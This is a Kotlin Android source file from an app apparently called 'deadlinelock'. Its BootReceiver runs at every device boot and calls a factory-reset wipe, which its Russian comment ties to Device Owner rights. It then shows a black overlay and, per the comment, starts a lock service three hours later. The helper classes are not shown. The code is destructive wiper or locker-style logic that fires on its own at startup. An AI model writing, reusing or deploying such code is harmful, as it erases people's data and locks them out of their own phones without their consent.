package com.rocket.deadlinelock

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Пытаемся сбросить телефон (если есть права Device Owner)
            FactoryReset.wipe(context)
            
            // Включаем черный экран
            val overlay = BlackoutOverlay(context)
            overlay.start {
                // После 3 часов включаем экран блокировки
                ContextCompat.startForegroundService(context, Intent(context, LockService::class.java))
            }
        }
    }
}
